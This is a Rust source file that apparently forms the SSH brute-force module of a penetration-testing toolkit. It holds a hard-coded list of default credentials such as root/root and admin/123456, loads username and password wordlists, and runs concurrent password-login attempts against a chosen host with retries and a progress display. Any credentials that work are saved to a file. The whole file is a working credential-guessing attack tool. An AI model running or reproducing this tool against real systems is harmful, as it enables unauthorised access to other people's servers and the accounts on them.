use anyhow::{anyhow, Result};
use colored::*;
use ssh2::Session;
use std::{
    collections::HashSet,
    fs::File,
    io::{BufRead, BufReader, Write},
    net::{TcpStream, ToSocketAddrs},
    path::{Path, PathBuf},
    sync::{
        atomic::{AtomicBool, AtomicU64, Ordering},
        Arc,
    },
    time::Instant,
};
use regex::Regex;
use tokio::{
    sync::{Mutex, Semaphore},
    task::spawn_blocking,
    time::{sleep, Duration, timeout},
};

// Constants
const DEFAULT_SSH_PORT: u16 = 22;
const PROGRESS_INTERVAL_SECS: u64 = 2;
const DEFAULT_CREDENTIALS: &[(&str, &str)] = &[
    ("root", "root"),
    ("admin", "admin"),
    ("user", "user"),
    ("guest", "guest"),
    ("root", "123456"),
    ("admin", "123456"),
    ("root", "password"),
    ("admin", "password"),
    ("root", ""),
    ("admin", ""),
    ("ubuntu", "ubuntu"),
    ("test", "test"),
    ("oracle", "oracle"),
];

// Statistics tracking
struct Statistics {
    total_attempts: AtomicU64,
    successful_attempts: AtomicU64,
    failed_attempts: AtomicU64,
    error_attempts: AtomicU64,
    retried_attempts: AtomicU64,
    start_time: Instant,
}

impl Statistics {
    fn new() -> Self {
        Self {
            total_attempts: AtomicU64::new(0),
            successful_attempts: AtomicU64::new(0),
            failed_attempts: AtomicU64::new(0),
            error_attempts: AtomicU64::new(0),
            retried_attempts: AtomicU64::new(0),
            start_time: Instant::now(),
        }
    }

    fn record_attempt(&self, success: bool, error: bool) {
        self.total_attempts.fetch_add(1, Ordering::Relaxed);
        if error {
            self.error_attempts.fetch_add(1, Ordering::Relaxed);
        } else if success {
            self.successful_attempts.fetch_add(1, Ordering::Relaxed);
        } else {
            self.failed_attempts.fetch_add(1, Ordering::Relaxed);
        }
    }

    fn record_retry(&self) {
        self.retried_attempts.fetch_add(1, Ordering::Relaxed);
    }

    fn print_progress(&self) {
        let total = self.total_attempts.load(Ordering::Relaxed);
        let success = self.successful_attempts.load(Ordering::Relaxed);
        let failed = self.failed_attempts.load(Ordering::Relaxed);
        let errors = self.error_attempts.load(Ordering::Relaxed);
        let retries = self.retried_attempts.load(Ordering::Relaxed);
        let elapsed = self.start_time.elapsed().as_secs_f64();
        let rate = if elapsed > 0.0 { total as f64 / elapsed } else { 0.0 };

        print!(
            "\r{} {} attempts | {} OK | {} fail | {} err | {} retry | {:.1}/s    ",
            "[Progress]".cyan(),
            total.to_string().bold(),
            success.to_string().green(),
            failed,
            errors.to_string().red(),
            retries,
            rate
        );
        let _ = std::io::Write::flush(&mut std::io::stdout());
    }

    fn print_final(&self) {
        println!();
        let total = self.total_attempts.load(Ordering::Relaxed);
        let success = self.successful_attempts.load(Ordering::Relaxed);
        let failed = self.failed_attempts.load(Ordering::Relaxed);
        let errors = self.error_attempts.load(Ordering::Relaxed);
        let retries = self.retried_attempts.load(Ordering::Relaxed);
        let elapsed = self.start_time.elapsed().as_secs_f64();

        println!("{}", "=== Statistics ===".bold());
        println!("  Total attempts:    {}", total);
        println!("  Successful:        {}", success.to_string().green().bold());
        println!("  Failed:            {}", failed);
        println!("  Errors:            {}", errors.to_string().red());
        println!("  Retries:           {}", retries);
        println!("  Elapsed time:      {:.2}s", elapsed);
        if elapsed > 0.0 {
            println!("  Average rate:      {:.1} attempts/s", total as f64 / elapsed);
        }
    }
}

pub async fn run(target: &str) -> Result<()> {
    println!("{}", "=== SSH Brute Force Module ===".bold());
    println!("[*] Target: {}", target);

    let port: u16 = loop {
        let input = prompt_default("SSH Port", &DEFAULT_SSH_PORT.to_string())?;
        match input.parse() {
            Ok(p) if p > 0 => break p,
            _ => println!("{}", "Invalid port. Must be between 1 and 65535.".yellow()),
        }
    };

    // Ask about default credentials
    let use_defaults = prompt_yes_no("Try default credentials first?", true)?;
    
    let usernames_file = if prompt_yes_no("Use username wordlist?", true)? {
        Some(prompt_existing_file("Username wordlist")?)
    } else {
        None
    };
    
    let passwords_file = if prompt_yes_no("Use password wordlist?", true)? {
        Some(prompt_existing_file("Password wordlist")?)
    } else {
        None
    };

    if !use_defaults && usernames_file.is_none() && passwords_file.is_none() {
        return Err(anyhow!("At least one wordlist or default credentials must be enabled"));
    }

    let concurrency: usize = loop {
        let input = prompt_default("Max concurrent tasks", "10")?;
        match input.parse() {
            Ok(n) if n > 0 && n <= 256 => break n,
            _ => println!("{}", "Invalid number. Must be between 1 and 256.".yellow()),
        }
    };

    let connection_timeout: u64 = loop {
        let input = prompt_default("Connection timeout (seconds)", "5")?;
        match input.parse() {
            Ok(n) if n >= 1 && n <= 60 => break n,
            _ => println!("{}", "Invalid timeout. Must be between 1 and 60 seconds.".yellow()),
        }
    };

    let retry_on_error = prompt_yes_no("Retry on connection errors?", true)?;
    let max_retries: usize = if retry_on_error {
        loop {
            let input = prompt_default("Max retries per attempt", "2")?;
            match input.parse() {
                Ok(n) if n > 0 && n <= 10 => break n,
                _ => println!("{}", "Invalid retries. Must be between 1 and 10.".yellow()),
            }
        }
    } else {
        0
    };

    let stop_on_success = prompt_yes_no("Stop on first success?", true)?;
    let save_results = prompt_yes_no("Save results to file?", true)?;
    let save_path = if save_results {
        Some(prompt_default("Output file", "ssh_brute_results.txt")?)
    } else {
        None
    };
    let verbose = prompt_yes_no("Verbose mode?", false)?;
    let combo_mode = prompt_yes_no("Combination mode? (try every pass with every user)", false)?;

    let connect_addr = normalize_target(target, port)?;

    println!("\n{}", format!("[*] Starting brute-force on {}", connect_addr).cyan());

    // Load wordlists
    let mut usernames = Vec::new();
    if let Some(ref file) = usernames_file {
        usernames = load_lines(file)?;
        if usernames.is_empty() {
            println!("{}", "[!] Username wordlist is empty.".yellow());
        } else {
            println!("{}", format!("[*] Loaded {} usernames", usernames.len()).green());
        }
    }

    let mut passwords = Vec::new();
    if let Some(ref file) = passwords_file {
        passwords = load_lines(file)?;
        if passwords.is_empty() {
            println!("{}", "[!] Password wordlist is empty.".yellow());
        } else {
            println!("{}", format!("[*] Loaded {} passwords", passwords.len()).green());
        }
    }

    // Add default credentials if requested
    if use_defaults {
        for (user, pass) in DEFAULT_CREDENTIALS {
            if !usernames.contains(&user.to_string()) {
                usernames.push(user.to_string());
            }
            if !passwords.contains(&pass.to_string()) {
                passwords.push(pass.to_string());
            }
        }
        println!("{}", format!("[*] Added {} default credentials", DEFAULT_CREDENTIALS.len()).green());
    }

    if usernames.is_empty() {
        return Err(anyhow!("No usernames available"));
    }
    if passwords.is_empty() {
        return Err(anyhow!("No passwords available"));
    }

    // Calculate total attempts
    let total_attempts = if combo_mode {
        usernames.len() * passwords.len()
    } else {
        passwords.len()
    };
    println!("{}", format!("[*] Total attempts: {}", total_attempts).cyan());
    println!();

    let found = Arc::new(Mutex::new(HashSet::new()));
    let stop = Arc::new(AtomicBool::new(false));
    let stats = Arc::new(Statistics::new());
    let semaphore = Arc::new(Semaphore::new(concurrency));
    let timeout_duration = Duration::from_secs(connection_timeout);

    // Start progress reporter
    let stats_clone = stats.clone();
    let stop_clone = stop.clone();
    let progress_handle = tokio::spawn(async move {
        loop {
            if stop_clone.load(Ordering::Relaxed) {
                break;
            }
            stats_clone.print_progress();
            sleep(Duration::from_secs(PROGRESS_INTERVAL_SECS)).await;
        }
    });

    // Generate credential pairs
    let mut tasks = Vec::new();
    let mut user_cycle_idx = 0usize;

    for pass in passwords.iter() {
        if stop_on_success && stop.load(Ordering::Relaxed) {
            break;
        }

        let selected_users: Vec<String> = if combo_mode {
            usernames.iter().cloned().collect()
        } else {
            if usernames.is_empty() {
                Vec::new()
            } else {
                let user = usernames[user_cycle_idx % usernames.len()].clone();
                user_cycle_idx += 1;
                vec![user]
            }
        };

        for user in selected_users {
            if stop_on_success && stop.load(Ordering::Relaxed) {
                break;
            }

            let addr_clone = connect_addr.clone();
            let user_clone = user.clone();
            let pass_clone = pass.clone();
            let found_clone = Arc::clone(&found);
            let stop_clone = Arc::clone(&stop);
            let stats_clone = Arc::clone(&stats);
            let semaphore_clone = semaphore.clone();
            let timeout_clone = timeout_duration;
            let stop_flag = stop_on_success;
            let verbose_flag = verbose;
            let retry_flag = retry_on_error;
            let max_retries_clone = max_retries;

            // Spawn task immediately - acquire permit INSIDE the task for true concurrency
            tasks.push(tokio::spawn(async move {
                if stop_flag && stop_clone.load(Ordering::Relaxed) {
                    return;
                }

                // Acquire semaphore permit inside the spawned task
                let _permit = match semaphore_clone.acquire_owned().await {
                    Ok(permit) => permit,
                    Err(_) => return,
                };
                
                if stop_flag && stop_clone.load(Ordering::Relaxed) {
                    return;
                }

                let mut retries = 0;
                loop {
                    match try_ssh_login(&addr_clone, &user_clone, &pass_clone, timeout_clone).await {
                        Ok(true) => {
                            println!("\r{}", format!("[+] {} -> {}:{}", addr_clone, user_clone, pass_clone).green());
                            let mut found_guard = found_clone.lock().await;
                            found_guard.insert((addr_clone.clone(), user_clone.clone(), pass_clone.clone()));
                            stats_clone.record_attempt(true, false);
                            if stop_flag {
                                stop_clone.store(true, Ordering::Relaxed);
                            }
                            break;
                        }
                        Ok(false) => {
                            stats_clone.record_attempt(false, false);
                            if verbose_flag {
                                println!("\r{}", format!("[-] {} -> {}:{}", addr_clone, user_clone, pass_clone).dimmed());
                            }
                            break;
                        }
                        Err(e) => {
                            stats_clone.record_attempt(false, true);
                            if retry_flag && retries < max_retries_clone {
                                retries += 1;
                                stats_clone.record_retry();
                                if verbose_flag {
                                    println!("\r{}", format!("[!] {} -> {}:{} (retry {}/{})", addr_clone, user_clone, pass_clone, retries, max_retries_clone).yellow());
                                }
                                sleep(Duration::from_millis(500)).await;
                                continue;
                            } else {
                                if verbose_flag {
                                    println!("\r{}", format!("[!] {} -> {}:{} error: {}", addr_clone, user_clone, pass_clone, e).red());
                                }
                                break;
                            }
                        }
                    }
                }
            }));
        }
    }

    // Wait for all tasks with bounded concurrency
    while let Some(result) = tasks.pop() {
        let _ = result.await;
    }

    stop.store(true, Ordering::Relaxed);
    let _ = progress_handle.await;

    stats.print_final();

    let creds = found.lock().await;
    if creds.is_empty() {
        println!("\n{}", "[-] No credentials found.".yellow());
    } else {
        println!("\n{}", format!("[+] Found {} valid credential(s):", creds.len()).green().bold());
        for (host, user, pass) in creds.iter() {
            println!("     {} -> {}:{}", host, user, pass);
        }

        if let Some(path_str) = save_path {
            let filename = get_filename_in_current_dir(&path_str);
            let mut file = File::create(&filename)?;
            for (host, user, pass) in creds.iter() {
                writeln!(file, "{} -> {}:{}", host, user, pass)?;
            }
            file.flush()?;
            println!("{}", format!("[+] Results saved to '{}'", filename.display()).green());
        }
    }

    Ok(())
}

async fn try_ssh_login(
    normalized_addr: &str,
    user: &str,
    pass: &str,
    timeout_duration: Duration,
) -> Result<bool> {
    let user_owned = user.to_string();
    let pass_owned = pass.to_string();
    let addr_owned = normalized_addr.to_string();

    let result = timeout(
        timeout_duration,
        spawn_blocking(move || {
            let tcp = TcpStream::connect(&addr_owned)
                .map_err(|e| anyhow!("Connection error: {}", e))?;
            
            let mut sess = Session::new()
                .map_err(|e| anyhow!("Failed to create SSH session: {}", e))?;
            sess.set_tcp_stream(tcp);
            
            sess.handshake()
                .map_err(|e| anyhow!("SSH handshake failed: {}", e))?;
            
            sess.userauth_password(&user_owned, &pass_owned)
                .map_err(|e| anyhow!("Authentication failed: {}", e))?;
            
            Ok(sess.authenticated())
        }),
    )
    .await
    .map_err(|_| anyhow!("Connection timeout"))??;

    result
}

fn normalize_target(host: &str, default_port: u16) -> Result<String> {
    let re = Regex::new(r"^\[*(?P<addr>[^\]]+?)\]*(?::(?P<port>\d{1,5}))?$").unwrap();
    let trimmed = host.trim();
    let caps = re
        .captures(trimmed)
        .ok_or_else(|| anyhow!("Invalid target format: {}", host))?;
    let addr = caps.name("addr").unwrap().as_str();
    let port = if let Some(m) = caps.name("port") {
        m.as_str()
            .parse::<u16>()
            .map_err(|_| anyhow!("Invalid port value in target '{}'", host))?
    } else {
        default_port
    };
    let formatted = if addr.contains(':') && !addr.contains('.') {
        format!("[{}]:{}", addr, port)
    } else {
        format!("{}:{}", addr, port)
    };

    formatted
        .to_socket_addrs()
        .map_err(|e| anyhow!("Could not resolve '{}': {}", formatted, e))?
        .next()
        .ok_or_else(|| anyhow!("Could not resolve '{}'", formatted))?;

    Ok(formatted)
}

fn prompt_existing_file(msg: &str) -> Result<String> {
    loop {
        let candidate = prompt_required(msg)?;
        if Path::new(&candidate).is_file() {
            return Ok(candidate);
        } else {
            println!(
                "{}",
                format!("File '{}' does not exist or is not a regular file.", candidate).yellow()
            );
        }
    }
}

fn prompt_required(msg: &str) -> Result<String> {
    loop {
        print!("{}", format!("{}: ", msg).cyan().bold());
        std::io::stdout().flush()?;
        let mut s = String::new();
        std::io::stdin().read_line(&mut s)?;
        let trimmed = s.trim();
        if !trimmed.is_empty() {
            return Ok(trimmed.to_string());
        } else {
            println!("{}", "This field is required.".yellow());
        }
    }
}

fn prompt_default(msg: &str, default: &str) -> Result<String> {
    print!("{}", format!("{} [{}]: ", msg, default).cyan().bold());
    std::io::stdout().flush()?;
    let mut s = String::new();
    std::io::stdin().read_line(&mut s)?;
    let trimmed = s.trim();
    Ok(if trimmed.is_empty() {
        default.to_string()
    } else {
        trimmed.to_string()
    })
}

fn prompt_yes_no(msg: &str, default_yes: bool) -> Result<bool> {
    let default_char = if default_yes { "y" } else { "n" };
    loop {
        print!("{}", format!("{} (y/n) [{}]: ", msg, default_char).cyan().bold());
        std::io::stdout().flush()?;
        let mut s = String::new();
        std::io::stdin().read_line(&mut s)?;
        let input = s.trim().to_lowercase();
        if input.is_empty() {
            return Ok(default_yes);
        } else if input == "y" || input == "yes" {
            return Ok(true);
        } else if input == "n" || input == "no" {
            return Ok(false);
        } else {
            println!("{}", "Invalid input. Please enter 'y' or 'n'.".yellow());
        }
    }
}

fn load_lines<P: AsRef<Path>>(path: P) -> Result<Vec<String>> {
    let file = File::open(path.as_ref())
        .map_err(|e| anyhow!("Failed to open file '{}': {}", path.as_ref().display(), e))?;
    let reader = BufReader::new(file);
    Ok(reader
        .lines()
        .filter_map(Result::ok)
        .filter(|l| !l.trim().is_empty())
        .collect())
}

fn get_filename_in_current_dir(input_path_str: &str) -> PathBuf {
    let path_candidate = Path::new(input_path_str)
        .file_name()
        .map(|os_str| os_str.to_string_lossy())
        .filter(|s_cow| !s_cow.is_empty() && s_cow != "." && s_cow != "..")
        .map(|s_cow| s_cow.into_owned())
        .unwrap_or_else(|| "ssh_brute_results.txt".to_string());
    
    PathBuf::from(format!("./{}", path_candidate))
}
